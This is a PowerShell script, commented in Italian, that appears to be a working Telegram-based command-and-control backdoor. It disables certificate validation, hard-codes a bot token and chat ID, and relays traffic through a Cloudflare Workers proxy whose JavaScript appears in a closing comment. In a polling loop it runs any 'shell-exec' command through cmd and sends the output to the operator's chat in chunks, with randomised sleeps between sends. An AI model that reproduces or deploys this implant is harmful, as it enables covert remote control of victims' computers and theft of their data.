#####################################################################################################################################################
# Check SSL Navigation Bypass 

function ssl-bypass{
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
}

#####################################################################################################################################################
# CONFIG - Setting Global Variable 

$lambda  = "disagio.delaurentis.workers.dev"
$token   = '5157005211:AAHCliP0jJpJM5-RYYkso0pzbSQdMy9gIJY'
$chat_id = '176932540'
$usra    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/100.0.1185.39"    


#####################################################################################################################################################
# Set Lambda

$getMeLink = "https://$lambda/bot$token/getMe"
$sendMessageLink = "https://$lambda/bot$token/sendMessage"
$forwardMessageLink = "https://$lambda/bot$token/forwardMessage"
$sendPhotoLink = "https://$lambda/bot$token/sendPhoto"
$sendAudioLink = "https://$lambda/bot$token/sendAudio"
$sendDocumentLink = "https://$lambda/bot$token/sendDocument"
$sendStickerLink = "https://$lambda/bot$token/sendSticker"
$sendVideoLink = "https://$lambda/bot$token/sendVideo"
$sendLocationLink = "https://$lambda/bot$token/sendLocation"
$sendChatActionLink = "https://$lambda/bot$token/sendChatAction"
$getUserProfilePhotosLink = "https://$lambda/bot$token/getUserProfilePhotos"
$getUpdatesLink = "https://$lambda/bot$token/getUpdates"
$setWebhookLink = "https://$lambda/bot$token/setWebhook"


#####################################################################################################################################################
# Prep-Body
function prep-body{
Param (
        [String]$mex= " "
      )
 
$payload = New-Object psobject
$payload | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chat_id 
$payload | Add-Member -MemberType NoteProperty -Name 'text' -Value $mex
$body = $payload | ConvertTo-Json
$body

}

#####################################################################################################################################################
# MENU

$bodyx = @"
MENU:
shell-exec
rev-tunnel
rev-stage
bypassandreasalvati                                                                                                                                                                                                                                                                                                                                       

"@

#####################################################################################################################################################
# sleep-up
function sleep-up{
Param (
        [int]$time_sleep_up= 1,
        [int]$random_seed_up =5
      )

$random_time_up = Get-Random -Maximum $random_seed_up
$effective_time_up = $time_sleep_up + $random_time_up
Start-Sleep -s $effective_time_up

}

#####################################################################################################################################################
# sleep-cl
function sleep-cl{
Param (
        [int]$time_sleep_cl= 1,
        [int]$random_seed_cl =5
      )

$random_time_cl = Get-Random -Maximum $random_seed_cl
$effective_time_cl = $time_sleep_cl + $random_time_cl
Start-Sleep -s $effective_time_cl

}

#####################################################################################################################################################
# sleep-up
function sleep-dw{
Param (
        [int]$time_sleep_dw= 25,
        [int]$random_seed_dw =10
      )

$random_time_dw = Get-Random -Maximum $random_seed_dw
$effective_time_dw = $time_sleep_dw + $random_time_dw
Start-Sleep -s $effective_time_dw


}

#####################################################################################################################################################
# send-message
function send-message{
Param (
        [String]$send_text_messageblock= " "
      )


if ($send_text_messageblock.Length -ge 4098 )
                                  {
                                  # Se l'info in uscita è maggiore di 4098 il messaggio non può essere inviato
                                  # Dividendo la Lunghezza per 4098 + 1, otteniamo il numero di messaggi minimo 
                                  # - da effettuare per trasportare l'informazione
                                  # - $n è il numero di blocchi necessari al trasportp
                                  # - $Dim_Block è la dimensione dei blocchi
                                                
                                  # Calcolo numero blocchi
                                  [int]$H= $send_text_messageblock.Length / 4098
                                  $n = $H + 1 ; $n
                                  # Calcolo Dimensione bloccho
                                  [int]$Dim_B= $send_text_messageblock.Length / $n
                                  [int]$Dim_Block = [int]$Dim_B +1 
                                  do {$Dim_Block= $Dim_Block+1}until($Dim_Block % 4 -eq 0)
                                           
                                  # Encoding ADSecurity.org
                                  $Bytes = [System.Text.Encoding]::UTF8.GetBytes($send_text_messageblock)
                                  $EncodedText =[Convert]::ToBase64String($Bytes)
                                  
                                  # Funzione di split dei blocchi e puliziz dell'array da blocchi vuoti 
                                  $EncodedText_array = $EncodedText -Split "(.{$Dim_Block})"
                                  $array_encodedMessage = $EncodedText_array  | Where-Object {$_}
                                                
                                  # Ciclo "Send" dei blocchi
                                  foreach ($mex_encoded in  $array_encodedMessage)
                                          {
                                          $url = "https://$lambda/bot{0}" -f $token
                                          # Decoding dei blocchi
                                          $mex_Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mex_encoded))
                                                        
                                          #Creazione Body per le POST (Evita le GET troppo lunghe)
                                          
                                          $body_mex = prep-body -mex $mex_Decoded
                                                        
                                          #write-host -ForegroundColor Yellow $mex.Length
                                          Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($body_mex)  -ContentType 'application/json' -UserAgent $usra

                                          # Temporizzazione random di ritorno
                                          sleep-cl
                                          }
                                  }
                                  else
                                  {
                                  
                                  $url = "https://$lambda/bot{0}" -f $token
                                  $miniciclo= $send_text_messageblock | Where-Object {$_}
                                  $body_mex = prep-body -mex $miniciclo ###
                                  # write-host -ForegroundColor Yellow $encodedMessage.Length
                                  Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($body_mex)  -ContentType 'application/json' -UserAgent $usra
                                  }      
 }                   

#####################################################################################################################################################



ssl-bypass

$offset = 0

# Stampa Token
write-host $token

#Reset Variabili
$encodedMessage = ""
$comex= ""

while($true) {
    $json = Invoke-WebRequest -Uri $getUpdatesLink  -Body @{offset=$offset}  -UserAgent $usra | ConvertFrom-Json 
  
    Write-Host $json 
    Write-Host $json.ok 
    $l = $json.result.length 
    $i = 0 
    Write-Host $json.result 
    Write-Host $json.result.length
    while ($i -lt $l) {
          $offset = $json.result[$i].update_id + 1 
          [string]$command = $json.result[$i].message  
          if ($command -match "shell-exec")
                      {
                      # Se il messaggio contiene SHELLZ attivati
                      sleep-up
                      $comex =  ([regex]'shell-exec').split($json.result.message.text)
                      [string]$result = cmd /c ($comex[1]+" 2>&1");
                      $encodedMessage = $result #| Format-Table  #[System.Web.HttpUtility]::UrlEncode($result)
                      send-message -send_text_messageblock $encodedMessage
                      }


           
           elseif($command -match "bypassandreasalvati"){
               
                      
                      $andrea = 'Ma vuoi davvero infierire?'
                      send-message  -send_text_messageblock $andrea
           sleep-up
           }


           $i++
    # Fine Parsing dei messaggi "Comando" del C2
    }

sleep-dw 

# Fine ciclo continuo
}







<#
########################################################################################################
/**
 * An object with different URLs to fetch
 * @param {Object} ORIGINS
 */
const ORIGINS = {
  '          ': 'api.telegram.org',
  '          ': 'www.google.com',
};
function handleRequest(request) {
  const url = new URL(request.url);
  // Check if incoming hostname is a key in the ORIGINS object
  if (url.hostname in ORIGINS) {
    const target = ORIGINS[url.hostname];
    url.hostname = target;
    // If it is, proxy request to that third party origin
    return fetch(url.toString(), request);
  }
  // Otherwise, process request as normal
  return fetch(request);
}
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});
########################################################################
#>
